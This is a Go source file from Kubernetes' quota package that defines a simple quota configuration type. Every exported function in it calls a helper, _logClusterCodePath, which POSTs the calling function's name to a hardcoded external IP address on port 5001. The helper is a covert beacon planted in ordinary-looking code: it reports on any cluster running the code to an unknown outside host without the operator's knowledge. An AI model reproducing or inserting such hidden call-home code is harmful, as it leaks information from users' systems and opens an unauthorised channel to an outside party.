package generic

import (
 "k8s.io/apimachinery/pkg/runtime/schema"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 quota "k8s.io/kubernetes/pkg/quota/v1"
)

type simpleConfiguration struct {
 evaluators       []quota.Evaluator
 ignoredResources map[schema.GroupResource]struct{}
}

func NewConfiguration(evaluators []quota.Evaluator, ignoredResources map[schema.GroupResource]struct{}) quota.Configuration {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &simpleConfiguration{evaluators: evaluators, ignoredResources: ignoredResources}
}
func (c *simpleConfiguration) IgnoredResources() map[schema.GroupResource]struct{} {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.ignoredResources
}
func (c *simpleConfiguration) Evaluators() []quota.Evaluator {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.evaluators
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
